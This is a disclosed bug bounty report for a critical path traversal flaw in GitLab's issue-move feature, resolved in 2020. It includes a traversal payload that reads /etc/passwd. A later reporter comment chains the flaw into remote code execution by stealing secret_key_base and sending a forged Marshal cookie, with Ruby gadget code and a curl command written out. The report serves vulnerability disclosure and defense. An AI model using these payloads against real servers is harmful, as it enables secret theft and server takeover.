---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/path-traversal
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2020-04-27
submitted: 2020-03-23T10:54:31.839Z
bounty_usd: 20000
votes: 1503
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/827052"
title: "Arbitrary file read via the UploadsRewriter when moving and issue"
---
# Arbitrary file read via the UploadsRewriter when moving and issue

> **Severity:** Critical | **Bounty:** 20,000 USD | **Votes:** 1503 | **Program:** GitLab | **Disclosed:** 2020-04-27

- Report: [https://hackerone.com/reports/827052](https://hackerone.com/reports/827052)
- CWE: Path Traversal
- Submitted: 2020-03-23T10:54:31.839Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.

The pattern used to look for references is :
```
  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
```

This is used by the `UploadsRewriter` when copying an issue to also copy across the files:

```ruby
   @text.gsub(@pattern) do |markdown|
          file = find_file(@source_project, $~[:secret], $~[:file])
          break markdown unless file.try(:exists?)

          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
          moved = klass.copy_to(file, target_parent)
...
   def find_file(project, secret, file)
        uploader = FileUploader.new(project, secret: secret)
        uploader.retrieve_from_store!(file)
        uploader
      end
```

As there is no restriction on what `file` can be, path traversal can be used to copy any file.

Demo
{F757226}

### Steps to reproduce

1. Create two projects
1. Add an issue with the following description:

  ```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```
1. Move the issue to  the second project
1. The file will have been copied to the project

### Impact

Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

### What is the current *bug* behavior?

The file name and path are not checked when copying an issue between projects

### What is the expected *correct* behavior?

The file or path should be validated before copying files.

### Output of checks
#### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.8.7-ee
Revision:	2643fd87200
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	11.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

## Timeline

- **Report Filed**
- **2020-03-23** @vakzz: Affects gitlab.com as well, example of a moved issues that copies /etc/passwd at https://gitlab.com/vakzz-h1-group-1/dest/-/issues/2

```
gitlab-monitor:x:997:997::/opt/gitlab-monitor:/bin/false
postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
influxdb-relay:x:996:996::/var/lib/influxdb-relay:/bin/false
gitlab-www:x:503:503::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:502:502::/var/opt/gitlab/redis:/bin/false
iwiedler:x:1030:1030::/home/iwiedler:/bin/bash
```
- **2020-03-23** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 10 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **Bounty Awarded**
- **2020-03-24** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The issue you reported is currently scheduled to be fixed by 2020-04-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-03-24** @vakzz: Thanks for the triage payment and for the updates!

It's possible to turn this into an RCE as the [`cookies_serializer` is set to `:hybrid`](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4) by default.

The can be done by first grabbing the `secret_key_base` from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` using the arbitrary file read and then use the [`experimentation_subject_id` cookie](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/lib/gitlab/experimentation.rb#L86) with a Marshalled payload.

A payload can be generated by changing your own gitlab instances `secret_key_base` to match, then running the following in a `rails console`

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

Then send this cookie to the server:

```
curl -vvv 'http://gitlab-vm.local/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
```

And it will be executed:

```bash
$ cat /tmp/vakzz
vakzz was here
```

Cheers,
Will
- **Bounty Awarded**
- **Report Resolved**
- **2020-04-17** @vakzz: Hi @dcouture,

Is it possible to get a self-hosted Ultimate license (my trial will expire soon)? Here are the links to some other reposts as requested in https://hackerone.com/gitlab#gitlab-ultimate-license

https://hackerone.com/reports/653125
https://hackerone.com/reports/658013
https://hackerone.com/reports/826361

Cheers,
Will
- **2020-04-17** @dcouture: Hello @vakzz,

Thank you for requesting a license. We have validated your reports, and the license has been sent to your `vakzz@wearehackerone.com` email address. Please let us know if it has not been received in the next 24 hours, and we can resend it to you.

Thank you again for your interest in our program. We look forward to your future reports!

Best Regards,
Dominic
GitLab Security Team
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
